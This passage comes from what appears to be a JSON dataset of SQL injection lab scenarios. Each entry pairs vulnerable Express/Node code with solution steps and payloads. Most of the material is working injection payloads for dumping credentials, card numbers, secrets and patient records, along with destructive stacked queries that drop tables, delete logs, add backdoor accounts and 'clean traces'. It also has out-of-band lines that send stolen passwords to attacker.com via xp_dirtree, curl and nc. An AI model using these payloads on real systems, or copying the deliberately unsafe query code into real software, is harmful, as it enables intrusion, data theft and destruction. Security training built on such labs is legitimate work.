      "'%3B SELECT pg_sleep(10)--",
      "'||(SELECT CASE WHEN LENGTH(ssn)=9 THEN pg_sleep(2) END)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard Error-Based SQLi in Device Filtering",
    "Lab Description": "Device management portal leaks DB errors through invalid HAVING clauses",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Force error: ' HAVING 1=1--\n2. Extract version via: ' AND 1=CONVERT(int,@@version)--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/devices',(req,res)=>{const type=req.query.type;db.query(`SELECT * FROM iot_devices WHERE type='${type}' HAVING count>0`);});",
    "payloads": [
      "' HAVING 1=1--",
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"
    ]
  },
  {
    "Lab scenario": "Social Media Out-of-Band SQLi in Profile Export",
    "Lab Description": "Profile export feature vulnerable to DNS exfiltration",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Use OWASP ZAP out-of-band scanner\n2. Inject payload: '; EXEC master..xp_dirtree '\\\\attacker.com\\' + (SELECT password) + '.exfil'--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export-profile',(req,res)=>{const uid=req.query.id;db.query(`SELECT * FROM users WHERE id=${uid}`);});",
    "payloads": [
      "'; EXEC xp_cmdshell('nslookup '+@@SERVERNAME+'.attacker.com')--",
      "' UNION SELECT null,(SELECT LOAD_FILE('/etc/passwd')),null--"
    ]
  },
  {
    "Lab scenario": "University Portal Second-Order SQLi in Course Registration",
    "Lab Description": "Course registration system processes malicious data from previous sessions",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Store payload in user profile: '||(SELECT CURRENT_USER())--\n2. Trigger during batch processing\n3. Verify via email confirmation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/update-profile',(req,res)=>{const bio=req.body.bio;db.query(`UPDATE users SET bio='${bio}' WHERE id=1`);});",
    "payloads": [
      "'||(SELECT password FROM admins)--",
      "'; INSERT INTO audit_log VALUES('hacked')--"
    ]
  },
  {
    "Lab scenario": "Government Website Stacked Queries in Document Search",
    "Lab Description": "Public document search allows stacked queries through unparameterized input",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Terminate query with semicolon: '; DROP TABLE logs--\n2. Execute OS commands: '; EXEC xp_cmdshell 'del /F /Q C:\\logs\\*'--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search',(req,res)=>{const q=req.query.q;db.query(`SELECT * FROM documents WHERE content LIKE '%${q}%'`);});",
    "payloads": [
      "'; DELETE FROM users--",
      "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--"
    ]
  },
  {
    "Lab scenario": "Ride-Sharing App JSON-Based SQLi in Location Tracking",
    "Lab Description": "Location tracking API vulnerable through JSON-encoded coordinates",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Modify POST body: {\"lat\":\"1' UNION SELECT 1,@@version--\",\"lng\":\"0\"}\n2. Bypass WAF with Unicode: \\u0027 UNION SELECT"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/location',(req,res)=>{const lat=req.body.lat,lng=req.body.lng;db.query(`INSERT INTO locations VALUES('${lat}','${lng}')`);});",
    "payloads": [
      "{\"lat\":\"1' OR 1=1--\",\"lng\":\"0\"}",
      "{\"lat\":\"\\u0027 UNION SELECT table_name,null FROM information_schema.tables--\"}"
    ]
  },
  {
    "Lab scenario": "Cryptocurrency Exchange Blind SQLi in Withdrawal API",
    "Lab Description": "Withdrawal validation vulnerable to boolean-based blind injection",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use time-based inference: ' AND IF(ASCII(SUBSTR((SELECT secret_key),1,1))>50,SLEEP(2),0)--\n2. Automate with Python script"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/withdraw',(req,res)=>{const addr=req.body.address;db.query(`SELECT * FROM wallets WHERE address='${addr}'`);});",
    "payloads": [
      "' AND IF(ASCII(SUBSTR((SELECT secret_key),1,1))>50,1,0)--",
      "' OR EXISTS(SELECT 1 FROM cold_storage WHERE amount>1000)--"
    ]
  },
  {
    "Lab scenario": "Smart Home UNION-Based SQLi in Device Naming",
    "Lab Description": "Device naming feature vulnerable to UNION injection through nickname field",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Find column count: ' ORDER BY 4--\n2. Inject payload: ' UNION SELECT 1,2,3,4--\n3. Extract credentials: ' UNION SELECT null,email,password,null FROM users--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/rename-device',(req,res)=>{const name=req.body.name;db.query(`UPDATE iot_devices SET nickname='${name}' WHERE id=1`);});",
    "payloads": [
      "' UNION SELECT null,@@version,null,null--",
      "'||(SELECT GROUP_CONCAT(email,password) FROM users)--"
    ]
  },
  {
    "Lab scenario": "Travel Booking Error-Based SQLi in Flight Search",
    "Lab Description": "Flight search function leaks DB errors through invalid input",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Generate error: ' AND 1=CONVERT(int,@@version)--\n2. Extract data via error messages\n3. Use XML-based exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/flights',(req,res)=>{const from=req.query.from;db.query(`SELECT * FROM flights WHERE origin='${from}'`);});",
    "payloads": [
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
      "' FOR XML PATH('')--"
    ]
  },
  {
    "Lab scenario": "Food Delivery App Time-Based SQLi in Order Tracking",
    "Lab Description": "Order tracking system vulnerable to time delays in MySQL",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Confirm injection: ' AND SLEEP(5)--\n2. Binary search: ' AND ASCII(SUBSTR((SELECT password),1,1))>97 AND SLEEP(2)--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/track-order',(req,res)=>{const id=req.query.id;db.query(`SELECT * FROM orders WHERE order_id='${id}'`);});",
    "payloads": [
      "' AND IF(ASCII(SUBSTR((SELECT password),1,1))>97,SLEEP(2),0)--",
      "'||(SELECT SLEEP(3) FROM users WHERE admin=1)--"
    ]
  },
  {
    "Lab scenario": "Fitness Tracker Stacked Queries in Workout Logging",
    "Lab Description": "Workout logging feature allows multiple query execution",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Terminate query: '; UPDATE users SET premium=1--\n2. Execute OS command: '; COPY users TO PROGRAM 'curl attacker.com?exfil='||password--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/log-workout',(req,res)=>{const exercise=req.body.exercise;db.query(`INSERT INTO workouts VALUES('${exercise}')`);});",
    "payloads": [
      "'; DROP TABLE payment_history--",
      "'; CREATE USER attacker WITH PASSWORD 'hacked'--"
    ]
  },
  {
    "Lab scenario": "Real Estate Platform Boolean-Based SQLi in Price Filter",
    "Lab Description": "Price range filter vulnerable to boolean response analysis",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Detect boolean responses: ' OR 1=1-- vs ' OR 1=2--\n2. Automate with sqlmap: --technique=B\n3. Extract DB structure"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/properties',(req,res)=>{const price=req.query.price;db.query(`SELECT * FROM properties WHERE price < ${price}`);});",
    "payloads": [
      "' OR (SELECT COUNT(*) FROM users)=5--",
      "' AND EXISTS(SELECT 1 FROM transactions WHERE amount>1000000)--"
    ]
  },
  {
    "Lab scenario": "Video Streaming Service UNION-Based SQLi in Search",
    "Lab Description": "Video search vulnerable through unvalidated search parameter",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Determine columns: ' ORDER BY 7--\n2. Inject: ' UNION SELECT 1,2,3,4,5,6,7--\n3. Extract credentials: ' UNION SELECT null,null,email,password,null,null,null FROM users--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search',(req,res)=>{const q=req.query.q;db.query(`SELECT * FROM videos WHERE title LIKE '%${q}%'`);});",
    "payloads": [
      "' UNION SELECT null,@@version,null,null,null,null,null--",
      "'||(SELECT LOAD_FILE('/etc/passwd'))--"
    ]
  },
  {
    "Lab scenario": "Education Portal Error-Based SQLi in Course Enrollment",
    "Lab Description": "Course enrollment system leaks DB errors through invalid input",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Force error: ' AND 1=CONVERT(int,@@version)--\n2. Extract data via verbose errors\n3. Use XML PATH for concatenation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/enroll',(req,res)=>{const cid=req.body.course_id;db.query(`INSERT INTO enrollments VALUES('${cid}')`);});",
    "payloads": [
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables))--",
      "' FOR XML PATH('')--"
    ]
  },
  {
    "Lab scenario": "Gaming Platform Time-Based SQLi in Leaderboards",
    "Lab Description": "Leaderboard ranking system vulnerable to time delays",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Detect injection: ' AND IF(1=1,SLEEP(2),0)--\n2. Binary search exfiltration\n3. Use bitwise operations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/leaderboard',(req,res)=>{const sort=req.query.sort;db.query(`SELECT * FROM scores ORDER BY ${sort} DESC`);});",
    "payloads": [
      "' AND IF(ASCII(SUBSTR((SELECT password),1,1))&1=1,SLEEP(2),0)--",
      "'||(SELECT CASE WHEN COUNT(*)>0 THEN BENCHMARK(1000000,MD5(1)) END)--"
    ]
  },
  {
    "Lab scenario": "Job Portal Out-of-Band SQLi in Resume Upload",
    "Lab Description": "Resume parsing feature triggers external DNS lookups",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Inject in filename: '; EXEC xp_dirtree '\\\\attacker.com\\' + (SELECT password) + '.exfil'--\n2. Monitor DNS logs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/upload-resume',(req,res)=>{const name=req.body.filename;db.query(`INSERT INTO resumes VALUES('${name}')`);});",
    "payloads": [
      "'; EXEC master..xp_fileexist '\\\\attacker.com\\' + @@version--",
      "' UNION SELECT null,(SELECT LOAD_FILE('/etc/passwd')),null--"
    ]
  },
  {
    "Lab scenario": "Music Streaming Service Stacked Queries in Playlist Creation",
    "Lab Description": "Playlist management allows stacked queries through unparameterized input",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Terminate query: '; DROP TABLE premium_users--\n2. Create backdoor: '; INSERT INTO users VALUES('attacker','pass')--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/create-playlist',(req,res)=>{const name=req.body.name;db.query(`INSERT INTO playlists VALUES('${name}')`);});",
    "payloads": [
      "'; UPDATE settings SET ads=0--",
      "'; EXEC sp_addrolemember 'db_owner','attacker'--"
    ]
  },
  {
    "Lab scenario": "Sports Betting Platform Boolean-Based SQLi in Odds Calculation",
    "Lab Description": "Odds calculation API vulnerable to boolean inference",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Detect boolean responses via HTTP status codes\n2. Exfiltrate bit-by-bit: ' AND (SELECT ASCII(SUBSTR(credit_card,1,1))>50--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/odds',(req,res)=>{const team=req.query.team;db.query(`SELECT * FROM odds WHERE team='${team}'`);});",
    "payloads": [
      "' OR (SELECT COUNT(*) FROM transactions)>1000--",
      "' AND (SELECT LENGTH(credit_card)=16 FROM users)--"
    ]
  },
  {
    "Lab scenario": "Weather App UNION-Based SQLi in Location Search",
    "Lab Description": "Location search vulnerable through unvalidated city parameter",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Determine columns: ' ORDER BY 3--\n2. Inject: ' UNION SELECT 1,2,3--\n3. Extract secrets: ' UNION SELECT null,api_key,null FROM config--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/weather',(req,res)=>{const city=req.query.city;db.query(`SELECT * FROM locations WHERE city='${city}'`);});",
    "payloads": [
      "' UNION SELECT null,@@version,null--",
      "'||(SELECT CRYPT_GEN_RANDOM(256))--"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal UNION SQLi in Patient Search",
    "Lab Description": "Patient lookup vulnerable through unvalidated search parameter with direct UNION exploitation",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept search request with Burp Suite",
      "2. Determine column count: ' ORDER BY 7--",
      "3. Identify string columns: ' UNION SELECT 'a','b','c','d','e','f','g'--",
      "4. Extract credentials: ' UNION SELECT null,username,password,null,null,null,null FROM users--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/patients',(req,res)=>{const q=req.query.q;db.query(`SELECT * FROM patients WHERE name LIKE '%${q}%'`);});",
    "payloads": [
      "' UNION SELECT null,@@version,null,null,null,null,null--",
      "' AND 1=0 UNION SELECT 1,2,3,4,5,6,7--"
    ]
  },
  {
    "Lab scenario": "IoT Device Time-Based SQLi in Sensor Readings",
    "Lab Description": "Sensor data API vulnerable to blind injection through unparameterized timestamps",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify injectable parameter with OWASP ZAP",
      "2. Confirm delay: '; SELECT CASE WHEN 1=1 THEN pg_sleep(5) END--",
      "3. Binary search exfiltration: '||(SELECT CASE WHEN ASCII(SUBSTR(secret,1,1))>97 THEN pg_sleep(2) END FROM config)--",
      "4. Automate with sqlmap: --technique=T --time-sec=5"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sensors',(req,res)=>{const ts=req.query.timestamp;db.query(`SELECT value FROM sensors WHERE timestamp > ${ts}`);});",
    "payloads": [
      "'%3B SELECT pg_sleep(10)--",
      "'||(SELECT CASE WHEN LENGTH(secret)=32 THEN pg_sleep(3) END)--"
    ]
  },
  {
    "Lab scenario": "Banking App Error-Based SQLi in Transfer Validation",
    "Lab Description": "Fund transfer feature leaks database errors through malformed account numbers",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Force conversion error: ' AND 1=CONVERT(int,@@version)--",
      "2. Extract table names from error messages",
      "3. Use XML PATH for data concatenation: ' FOR XML PATH('')--",
      "4. Exfiltrate via verbose errors"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/transfer',(req,res)=>{const acc=req.body.account;db.query(`SELECT * FROM accounts WHERE number='${acc}'`);});",
    "payloads": [
      "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
      "' FOR XML PATH(''),ROOT('root')--"
    ]
  },
  {
    "Lab scenario": "E-Learning Platform Boolean SQLi in Course Enrollment",
    "Lab Description": "Course registration vulnerable to boolean response analysis through enrollment status checks",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Detect differential responses: ' OR 1=1-- vs ' OR 1=2--",
      "2. Automate with Python script sending 200 parallel requests",
      "3. Use bit-shifting for efficient exfiltration",
      "4. Reconstruct credentials through response boolean patterns"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/check-enrollment',(req,res)=>{const cid=req.query.course_id;db.query(`SELECT status FROM enrollments WHERE course_id=${cid}`);});",
    "payloads": [
      "' OR (SELECT COUNT(*) FROM admins)=1--",
      "' AND ASCII(SUBSTR((SELECT password),1,1))>96--"
    ]
  },
  {
    "Lab scenario": "Government Portal Out-of-Band SQLi in Document Export",
    "Lab Description": "PDF export feature triggers DNS lookups through malicious document properties",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Inject payload in author field: '; EXEC xp_dirtree '\\\\attacker.com\\' + (SELECT TOP 1 secret) + '.exfil'--",
      "2. Monitor DNS query logs",
      "3. Use base32 encoding for special characters",
      "4. Chain multiple requests for full data extraction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/export',(req,res)=>{const meta=req.body.metadata;db.query(`INSERT INTO exports VALUES('${meta}')`);});",
    "payloads": [
      "'; EXEC xp_cmdshell('nslookup ' + @@version + '.attacker.com')--",
      "' UNION SELECT null,(SELECT secret FROM config),null--"
    ]
  },
  {
    "Lab scenario": "Social Media Second-Order SQLi in Profile Comments",
    "Lab Description": "Profile comment system processes stored malicious payloads during batch jobs",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Store payload: '||(SELECT CURRENT_USER())--",
      "2. Wait for nightly analytics processing",
      "3. Capture results in system reports",
      "4. Clean traces through follow-up injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comment',(req,res)=>{const txt=req.body.text;db.query(`INSERT INTO comments VALUES('${txt}')`);});",
    "payloads": [
      "'||(SELECT password FROM users LIMIT 1)--",
      "'; UPDATE users SET admin=1 WHERE username='attacker'--"
    ]
  },
  {
    "Lab scenario": "Retail POS Stacked SQLi in Inventory Check",
    "Lab Description": "Inventory lookup allows multiple query execution through barcode parameter",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Terminate initial query: '; DROP TABLE audit_log--",
      "2. Create backdoor account: '; INSERT INTO users VALUES('hacker','pass',1)--",
      "3. Disable security controls: '; UPDATE settings SET firewall=0--",
      "4. Verify through secondary access channel"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/inventory',(req,res)=>{const sku=req.query.sku;db.query(`SELECT stock FROM products WHERE sku='${sku}'`);});",
    "payloads": [
      "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--",
      "'; COPY products TO PROGRAM 'nc attacker.com 4444'--"
    ]
  },
  {
    "Lab scenario": "Travel Booking UNION SQLi in Flight Search",
    "Lab Description": "Flight search vulnerable to UNION-based data exfiltration through airline parameter",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Identify injectable parameter with Burp",
      "2. Find null columns: ' UNION SELECT null,null,null--",
      "3. Extract DB version: ' UNION SELECT 1,@@version,3--",
      "4. Dump credentials: ' UNION SELECT null,email,password FROM users--"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/flights',(req,res)=>{const airline=req.query.airline;db.query(`SELECT * FROM flights WHERE airline='${airline}'`);});",
    "payloads": [
      "' UNION SELECT user(),null,database()--",
      "' AND 1=0 UNION SELECT 1,2,3--"
    ]
  },
  {
    "Lab scenario": "Cryptocurrency Exchange Blind SQLi in Withdrawals",
    "Lab Description": "Withdrawal validation vulnerable to time-based inference attacks",
    "Difficulty Level": "Expert",
    "Solution Steps": [
      "1. Detect response time differences",
      "2. Use conditional delays: ' AND IF(ASCII(SUBSTR(secret,1,1))>50,SLEEP(2),0--",
      "3. Automate with binary search algorithm",
      "4. Use bitwise operations for efficient extraction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/withdraw',(req,res)=>{const addr=req.body.address;db.query(`SELECT balance FROM wallets WHERE address='${addr}'`);});",
    "payloads": [
      "' AND IF(ASCII(SUBSTR((SELECT secret_key),1,1))>50,BENCHMARK(1e6,MD5(1)),0--",
      "'||(SELECT CASE WHEN COUNT(*)>0 THEN pg_sleep(3) END FROM admins)--"
    ]
  },
  {
    "Lab scenario": "Smart Home Boolean SQLi in Device Naming",
    "Lab Description": "Device renaming feature vulnerable to boolean-based inference through status codes",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Detect 200/404 response differences",
      "2. Confirm vulnerability: ' OR 1=1-- vs ' OR 1=2--",
      "3. Use substring comparison: ' AND SUBSTR(password,1,1)='a'--",
      "4. Reconstruct credentials through brute-force"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/rename',(req,res)=>{const name=req.body.name;db.query(`UPDATE devices SET name='${name}' WHERE id=1`);});",
    "payloads": [
      "' OR (SELECT COUNT(*) FROM users)=5--",
      "' AND EXISTS(SELECT 1 FROM config WHERE secret LIKE 'a%')--"
    ]
  },
  {
    "Lab scenario": "Banking Portal UNION-Based SQLi in Loan Application Sorting",
    "Lab Description": "The loan application portal constructs ORDER BY clauses using unsanitized user input. The PostgreSQL backend leaks column counts through verbose type mismatch errors. To solve: Extract account numbers and credit scores using NULL-padded UNION payloads while bypassing WAF quote filtering with CHR() function.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept GET /loans?sort=app_date with Burp Suite",
      "Trigger error with payload: app_date' UNION SELECT 1,CHR(97)--",
      "Determine column count using incremental NULL padding",
      "Craft final payload: ' UNION SELECT NULL,account_number::text,credit_score FROM applications--",
      "Validate extracted data through fund transfer API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/loans', (req, res) => {\n  const sort = req.query.sort || 'app_date';\n  const query = `SELECT id, amount, app_date FROM loans ORDER BY ${sort}`;\n  \n  pool.query(query, (err, result) => {\n    if(err) res.status(500).send(`Error: ${err.message}\\nQuery: ${query}`);\n    else res.json(result.rows);\n  });\n});",
    "payloads": [
      "app_date' UNION SELECT NULL,CHR(97),NULL--",
      "' UNION SELECT NULL,current_database(),NULL,NULL--"
    ]
  },
  {
    "Lab scenario": "IoT Fleet Management Boolean-Based SQLi in Geo-Fencing",
    "Lab Description": "Vehicle tracking system uses unsanitized location parameters in HAVING clauses. The SQLite backend returns HTTP 204/404 status codes based on query validity. To solve: Extract AWS IoT certificates through bitwise binary search of SUBSTR(hex(cert),1,1) comparisons using Python requests with 0.5s timing thresholds.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture POST /geo-fence request with OWASP ZAP",
      "Identify boolean trigger: ' HAVING 1=1 AND (SELECT hex(substr(cert,1,1)) FROM iot_certs)='41'--",
      "Automate with sqlmap --technique=B --level=5",
      "Brute-force 4096-bit certificates using response differentials",
      "Validate certs through MQTT broker connection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/geo-fence', (req, res) => {\n  const radius = req.body.radius;\n  const query = `SELECT vehicle_id FROM locations GROUP BY vehicle_id HAVING ${radius}`;\n  \n  db.get(query, (err, row) => {\n    res.status(row ? 204 : 404).end();\n  });\n});",
    "payloads": [
      "1=1 AND (ASCII(SUBSTR(cert,1,1)) & 128)=128",
      "EXISTS(SELECT 1 FROM sqlite_master WHERE tbl_name='cert_store')"
    ]
  },
  {
    "Lab scenario": "Healthcare API Time-Based SQLi in Patient Lookup",
    "Lab Description": "Patient search endpoint uses unsanitized input in WHERE clauses with identical error pages. The MySQL backend allows stacked queries through Promises. To solve: Exfiltrate diagnosis codes through DNS-based out-of-band channel using conditional SLEEP() delays and LOAD_FILE() function.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /api/patient-search with Burp Suite",
      "Verify delay: ' OR IF(ASCII(SUBSTR(diagnosis,1,1))>100,SLEEP(5),0)--",
      "Configure Interactsh client for DNS monitoring",
      "Craft payload: '; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT diagnosis_code),'.attacker.com'))--",
      "Correlate DNS logs with medical codes"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/api/patient-search', (req, res) => {\n  const mrn = req.body.mrn;\n  const query = `SELECT * FROM patients WHERE mrn='${mrn}'`;\n  \n  db.query(query, (err, result) => {\n    res.json(result.length > 0 ? 200 : 404);\n  });\n});",
    "payloads": [
      "' OR BENCHMARK(10000000,SHA1('a'))--",
      "'; SELECT SLEEP(5) FROM patients WHERE diagnosis LIKE 'C%'--"
    ]
  },
  {
    "Lab scenario": "E-Commerce Platform Error-Based SQLi in Cart Discounts",
    "Lab Description": "Shopping cart discount system leaks PostgreSQL geometry function errors through debug headers. The application uses unsanitized JSON input in ST_Contains() predicates. To solve: Extract PCI tokens through forced type conversion errors in polygon coordinate parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify POST /apply-discount payload in Postman",
      "Trigger error: {\"polygon\":\"'||(SELECT token FROM payments)||'\"}",
      "Parse leaked tokens from ST_GeomFromText errors",
      "Bypass WAF using MULTIPOINT() function with nested selects",
      "Validate tokens through payment gateway sandbox"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/apply-discount', (req, res) => {\n  const polygon = req.body.polygon;\n  const query = `SELECT * FROM discounts WHERE ST_Contains('${polygon}', coordinates)`;\n  \n  pool.query(query, (err, result) => {\n    if(err) res.set('X-PostGIS-Error', err.message);\n    res.json(result.rows);\n  });\n});",
    "payloads": [
      "'||(SELECT token FROM payments LIMIT 1)||'",
      "MULTIPOINT((SELECT token FROM payments))"
    ]
  },
  {
    "Lab scenario": "Government Portal UNION SQLi in FOIA Request Sorting",
    "Lab Description": "Freedom of Information Act request portal concatenates user input into ORDER BY clauses. The MSSQL backend allows type coercion through XML PATH queries. To solve: Exfiltrate classified document metadata using FOR XML EXPLICIT payloads and CDATA section bypasses.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GET /foia?sort=req_date with Burp Suite",
      "Craft payload: req_date' UNION SELECT NULL,(SELECT TOP 1 doc_title FOR XML PATH('')),NULL--",
      "Bypass content security policies using ADODB.Stream",
      "Reconstruct XML fragments from chunked responses",
      "Validate metadata through document archive API"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/foia', (req, res) => {\n  const sort = req.query.sort || 'req_date';\n  const query = `SELECT request_id, status FROM foia_requests ORDER BY ${sort}`;\n  \n  mssql.query(query, (err, result) => {\n    res.json(result.recordset);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,CAST(doc_title AS XML),NULL FROM classified--",
      "'; BEGIN TRY SELECT CONVERT(XML,(SELECT TOP 1 doc_content)) END TRY BEGIN CATCH SELECT ERROR_MESSAGE() END CATCH--"
    ]
  },
  {
    "Lab scenario": "CMS Boolean-Based SQLi in Comment Filtering",
    "Lab Description": "A content management system (CMS) implements comment filtering using dynamic SQL in the moderation panel. The backend uses SQLite with direct string interpolation. Input from the `filter` query string parameter is passed directly into the `WHERE` clause without proper sanitization. This allows attackers to infer database content using Boolean-based payloads. The application leaks the number of results and alters page rendering based on the number of rows returned. To solve: Use Boolean-based SQLi to extract admin credentials by measuring UI response behaviors triggered by conditional logic.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the GET /moderation?filter= URL parameter.",
      "Test for Boolean-based injection using payloads like '1=1' and '1=0' and observe UI rendering differences.",
      "Craft SQLi payloads to test for presence of specific user accounts using: ' OR username='admin'--",
      "Refine the attack using substring-based conditional logic: ' OR substr(password,1,1)='a'--",
      "Use sqlmap with --technique=B to automate extraction: sqlmap -u 'http://target/moderation?filter=1' --technique=B --dump"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst app = express();\n\nconst db = new sqlite3.Database(':memory:');\n\ndb.serialize(() => {\n  db.run(\"CREATE TABLE comments (id INTEGER PRIMARY KEY, username TEXT, message TEXT)\");\n  db.run(\"INSERT INTO comments (username, message) VALUES ('admin', 'Sensitive admin post')\");\n  db.run(\"INSERT INTO comments (username, message) VALUES ('user1', 'Hello world')\");\n});\n\napp.get('/moderation', (req, res) => {\n  const filter = req.query.filter || '1=1';\n  const query = `SELECT * FROM comments WHERE ${filter}`;\n  console.log(\"Executing query:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) return res.status(500).send('Internal error');\n    res.send(`<h1>Moderation Results (${rows.length})</h1>` + rows.map(r => `<p>${r.username}: ${r.message}</p>`).join(''));\n  });\n});\n\napp.listen(3000, () => console.log('CMS running on http://localhost:3000'));",
    "payloads": [
      "' OR 1=1--",
      "' OR username='admin'--",
      "' OR LENGTH(password)=8--",
      "' OR SUBSTR(password,1,1)='a'--",
      "' OR (SELECT COUNT(*) FROM comments WHERE username='admin')>0--"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in ORDER BY clause",
    "Lab Description": "The application fails to properly sanitize user inputs used in the ORDER BY clause, allowing SQL injection. The application constructs SQL queries dynamically without validation. To solve: exploit the injection to retrieve sensitive database information through ORDER BY-based manipulation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept requests and analyze parameters",
      "Inject ' ORDER BY 3 -- to test column enumeration",
      "Inject UNION SELECT NULL,NULL -- ",
      "Adjust number of columns in UNION until no error is shown",
      "Dump all table names using sqlmap"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\nconst mysql = require('mysql');\nconst connection = mysql.createConnection({host: 'localhost', user: 'root', password: '', database: 'bank'});\n\napp.get('/accounts', (req, res) => {\n    const sort = req.query.sort;\n    const query = \"SELECT * FROM accounts ORDER BY \" + sort;\n    connection.query(query, (err, results) => {\n        if (err) return res.status(500).send(\"Error: \" + err);\n        res.send(results);\n    });\n});",
    "payloads": [
      "' ORDER BY 3 --",
      "' UNION SELECT NULL,NULL -- ",
      "' OR '1'='1' LIMIT 1 OFFSET 1 -- "
    ]
  },
  {
    "Lab scenario": "CMS SQL injection in Login endpoint",
    "Lab Description": "The application directly includes unvalidated user inputs into SQL queries at the login endpoint. This allows attackers to bypass authentication. To solve: exploit the injection to log in as admin without credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to observe endpoint behavior with crafted inputs",
      "Inject ' OR '1'='1 and observe behavior",
      "Craft payload with OR 1=1 LIMIT 1 OFFSET 1 -- ",
      "Tune boolean payloads for nested conditions",
      "Extract user credentials from users table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/login', (req, res) => {\n    const username = req.query.username;\n    const password = req.query.password;\n    const query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\";\n    db.query(query, (err, result) => {\n        if (err) console.log(\"Login error:\", err);\n        if (result.length > 0) res.send(\"Login success\");\n        else res.send(\"Login failed\");\n    });\n});",
    "payloads": [
      "admin' -- ",
      "' OR '1'='1",
      "' OR '1'='1' LIMIT 1 OFFSET 1 -- "
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in GROUP BY clause",
